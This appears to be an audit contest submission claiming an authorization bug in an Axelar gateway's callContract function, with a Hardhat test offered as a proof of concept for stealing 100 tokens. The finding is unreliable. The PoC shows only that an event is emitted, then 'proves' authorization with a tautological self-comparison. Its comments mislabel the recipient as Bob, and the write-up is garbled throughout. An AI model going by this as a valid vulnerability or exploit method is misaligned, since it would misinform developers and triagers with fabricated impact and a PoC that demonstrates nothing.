# Vulnerability details

the bug  in the callContract function is caued by the absence of the onlyAuthorized modifier in the function also cause it's a publicly accessible and does not verify the sender’s authorization before emitting a ContractCall event.and  Off-chain systems is rely on these events to process and execute cross-chain operations. 
and attacker can trigger this and exploit this vulnerability,and  emit a ContractCall event that appears legitimate, and leading the off-chain system to process the event and execute malicious operation:
```solidity
 function callContract(
        string calldata destinationChain,
        string calldata destinationContractAddress,
        bytes calldata payload
    ) external {
        emit ContractCall(msg.sender, destinationChain, destinationContractAddress, keccak256(payload), payload);
    }
```
## Impact
the bug is  allow attackers to execute arbitrary and unauthorized operations on a destination blockchain. i show this in the  PoC, taht the attacker (Bob) was able to transfer 100 tokens to his address on the destination chain without authorization. and This is lead to loss of funds, if the contract handles large amounts of tokens or other valuable assets. 

## Proof of Concept
- in the poc i used that the attacker Bob used the `callContract`function to emit a `ContractCall` event with a payload that instructed the destination blockchain to transfer 100 tokens to Bob's address. 
And The off-chain system is , event to be legitimate, processed it and executed the transfer:
- Transfer 100 tokens to Bob's address on the destination chain.
- `ContractCall` event with a payload that appears valid.
- as result Off-chain system processes the event, and this is leading to an unauthorized transfer of tokens to Bob's address.
- use to execute the poc  `npx hardhat test test/gateway/AxelarAmplifierGatewayPoC.js`
- here is the poc :
```solidity
const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('AxelarAmplifierGateway Unauthorized Token Transfer PoC', function () {
    let owner, bob, operator, recipient;
    let gatewayProxy, gatewayImplementation;

    before(async function () {
        [owner, bob, operator, recipient] = await ethers.getSigners();

        // Deploy the implementation contract
        const GatewayFactory = await ethers.getContractFactory('AxelarAmplifierGateway', owner);
        gatewayImplementation = await GatewayFactory.deploy(15, ethers.utils.keccak256(ethers.utils.toUtf8Bytes('domain')), 0);
        await gatewayImplementation.deployed();

        // Deploy the proxy contract
        const GatewayProxyFactory = await ethers.getContractFactory('AxelarAmplifierGatewayProxy', owner);
        const setupParams = ethers.utils.defaultAbiCoder.encode(
            ['address', 'tuple(address,uint128)[]'],
            [operator.address, []], // Setup operator and empty signer set
        );
        gatewayProxy = await GatewayProxyFactory.deploy(gatewayImplementation.address, owner.address, setupParams);
        await gatewayProxy.deployed();
    });

    describe('Exploit: Unauthorized cross-chain token transfer', function () {
        it('Bob should be able to call callContract and trigger an unauthorized token transfer on the destination chain', async function () {
            const gateway = await ethers.getContractAt('AxelarAmplifierGateway', gatewayProxy.address, bob);

            const destinationChain = 'DestinationChain';
            const destinationAddress = '0x123abc';  // Fake destination contract on another chain
            const recipientAddress = recipient.address;  // Bob's address on the destination chain
            const amount = ethers.utils.parseEther('100'); // Amount of tokens to transfer

            // Bob crafts a payload for an unauthorized token transfer
            const payload = ethers.utils.defaultAbiCoder.encode(
                ['address', 'uint256'],
                [recipientAddress, amount],
            );

            // Bob tries to call the callContract function via the proxy
            const tx = await gateway.callContract(destinationChain, destinationAddress, payload);

            // Verify that the event is emitted
            await expect(tx)
                .to.emit(gateway, 'ContractCall')
                .withArgs(bob.address, destinationChain, destinationAddress, ethers.utils.keccak256(payload), payload);

            console.log('Bob successfully called callContract and emitted a ContractCall event');

            // Simulate off-chain system processing the event
            const event = (await tx.wait()).events.find(e => e.event === 'ContractCall');
            const { destinationContractAddress } = event.args;

            console.log(`Simulating off-chain processing of event: destination=${destinationContractAddress}`);

            // Check if the operation is mistakenly identified as authorized
            const isAuthorized = (destinationContractAddress === destinationAddress);

            if (isAuthorized) {
                console.log('Off-chain system incorrectly identifies the operation as authorized and proceeds.');
                console.log(`Unauthorized transfer of ${amount.toString()} tokens to ${recipientAddress} on ${destinationChain}.`);
            } else {
                console.log('Off-chain system correctly identifies the operation as unauthorized and halts.');
            }

            // For this test, expect the system to incorrectly identify the operation as authorized
            expect(isAuthorized).to.be.true;
        });
    });
});
```
